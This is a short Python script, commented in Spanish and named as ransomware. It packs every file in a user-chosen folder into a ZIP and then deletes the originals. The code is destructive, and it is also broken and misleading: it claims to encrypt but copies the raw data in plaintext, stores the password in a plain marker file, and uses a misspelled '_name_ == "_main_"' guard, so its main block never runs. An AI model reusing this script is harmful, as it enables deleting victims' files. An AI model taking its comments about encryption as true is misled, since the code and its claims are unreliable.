# ransomware_encrypt.py
import os
import zipfile

# Nombre del archivo ZIP predefinido
ZIP_FILENAME = "archivos_cifrados.zip"

# Solicitar la contraseña para cifrar
user_password = input("Ingresa la contraseña para cifrar los archivos: ")

def encrypt_files_to_zip(folder, zip_filename, password):
    """Encripta todos los archivos en el directorio dado y los guarda en un ZIP."""
    # Crear un archivo ZIP para almacenar los archivos cifrados
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        # Guardar un archivo marcador con la contraseña
        zipf.writestr("password_marker.txt", password)

        for root, _, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_file_name = f"{file}.enc"

                # Escribe el archivo cifrado en el ZIP
                zipf.writestr(encrypted_file_name, file_data)

                # Borra el archivo original después de cifrar
                os.remove(file_path)

if _name_ == "_main_":
    folder_to_encrypt = input("Ingresa la dirección de la carpeta que quieres cifrar: ")

    # Crea el archivo ZIP con un marcador de contraseña
    encrypt_files_to_zip(folder_to_encrypt, ZIP_FILENAME, user_password)